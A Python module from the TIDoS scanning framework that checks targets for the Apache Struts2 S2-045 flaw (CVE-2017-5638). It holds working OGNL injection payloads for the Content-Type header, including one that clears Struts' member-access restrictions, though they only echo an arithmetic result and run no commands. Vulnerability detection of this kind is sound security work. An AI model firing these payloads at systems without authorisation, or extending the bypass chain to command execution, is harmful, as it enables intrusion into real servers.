#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#This module requires TIDoS Framework
#https://github.com/0xInfection/TIDoS-Framework

"""Apache Struts2 Content-Type OGNL injection (S2-045, CVE-2017-5638)."""

from __future__ import annotations

from urllib.parse import urljoin

from core.methods import fileinj, inject
from core.methods import modkit as kit
from core.methods.print import pvln

info = ("Detects Apache Struts2 S2-045 (CVE-2017-5638): an OGNL expression in the Content-Type "
        "header that multiplies two random numbers and writes the result into a response header and "
        "into the body. Only the computed product counts (an echoed header never contains it); no "
        "OS command is executed. PATH selects the action(s) to test (default: the target URL).")
searchinfo = "Struts Shock Detector"
properties = {
    "PATH": ["Comma-separated action path(s) or URL(s), e.g. /login.action (default: target URL)", ""],
}

HEADER = "X-Tid-Check"

# multipart/form-data must be in the header for the Jakarta parser to be used
HEADER_OGNL = (
    "%{{(#_='multipart/form-data')."
    "(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
    ".addHeader('{header}',{a}*{b}))}}"
)
BODY_OGNL = (
    "%{{(#_='multipart/form-data')."
    "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    "(#_memberAccess?(#_memberAccess=#dm):"
    "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    "(#ognlUtil.getExcludedPackageNames().clear())."
    "(#ognlUtil.getExcludedClasses().clear())."
    "(#context.setMemberAccess(#dm))))."
    "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    "(#ros.println('{m}'+({a}*{b})))."
    "(#ros.flush())}}"
)


def targets(web) -> list[str]:
    base = kit.url(web) + "/"
    raw = kit.option(properties, "PATH", "Action path(s) to test, comma-separated (enter for the target)", "")
    paths = [p.strip() for p in raw.split(",") if p.strip()] if raw else [kit.url(web)]
    return list(dict.fromkeys(urljoin(base, p) if "://" not in p else p for p in paths))


def probe(s, url: str) -> str:
    a, b = fileinj.numbers()
    try:
        r = s.get(url, headers={"Content-Type": HEADER_OGNL.format(header=HEADER, a=a, b=b)},
                  allow_redirects=False)
    except Exception:
        r = None
    if r is not None and r.headers.get(HEADER, "").strip() == str(a * b):
        return f"OGNL {a}*{b} in Content-Type -> response header {HEADER}: {a * b}"

    a, b = fileinj.numbers()
    m = inject.marker(5)
    try:
        r = s.get(url, headers={"Content-Type": BODY_OGNL.format(m=m, a=a, b=b)}, allow_redirects=False)
    except Exception:
        return ""
    if f"{m}{a * b}" in fileinj.body(r):
        return f"OGNL '{m}'+{a}*{b} in Content-Type -> '{m}{a * b}' in the response body"
    return ""


def strutsshock(web):
    pvln("apache struts shock")
    rec = kit.Recorder(web, kit.CRITICAL, "strutsshock")
    s = kit.http(timeout=15)
    hits = []
    for url in targets(web):
        kit.info(f"Testing {url}")
        ev = probe(s, url)
        if ev:
            kit.found("Struts2 S2-045 / CVE-2017-5638 (confirmed)", url)
            kit.bullet(ev)
            hits.append(f"S2-045 / CVE-2017-5638 (confirmed): {url} -- {ev}")
    if not hits:
        kit.bad("Not vulnerable to Struts2 S2-045 (Content-Type OGNL).")
        rec("Not vulnerable to Struts2 S2-045 (Content-Type OGNL).")
    else:
        rec(hits)
    return hits


def attack(web):
    strutsshock(web)
